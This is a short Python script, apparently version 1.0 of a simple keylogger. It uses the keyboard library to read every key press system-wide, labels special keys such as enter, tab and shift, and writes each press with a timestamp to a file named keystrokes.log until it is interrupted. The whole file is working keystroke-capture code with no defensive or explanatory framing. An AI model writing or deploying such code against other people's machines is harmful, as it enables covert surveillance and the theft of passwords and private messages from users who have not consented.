# Version 1.0
import sys
import keyboard
import datetime
import logging

def logKeys(keys):
    format = f"[{datetime.datetime.now()}]" + " " + keys 
    logging.info(format)

def keyPressed():
    while True:
        key = keyboard.read_event()

        if key.event_type == keyboard.KEY_DOWN:
            if key.name == "enter":
                return "[enter]\n"

            elif key.name == "escape":
                return " [escape] "
            
            elif key.name == "tab":
                return " [tab] "

            elif key.name == "backspace":
                return " [bkspace] "

            elif key.name == "space":
                return " [space] "
            
            elif key.name == "shift":
                return " [shift] "
            
            elif key.name == "ctrl":
                return " [ctrl] "
            
            else:
                return key.name


if __name__ == "__main__":

    logging.basicConfig(filename="keystrokes.log", level=logging.INFO)
    while True:
        try:
            key = keyPressed()
            logKeys(key)
        except KeyboardInterrupt:
            print("Stopped....")
            sys.exit()
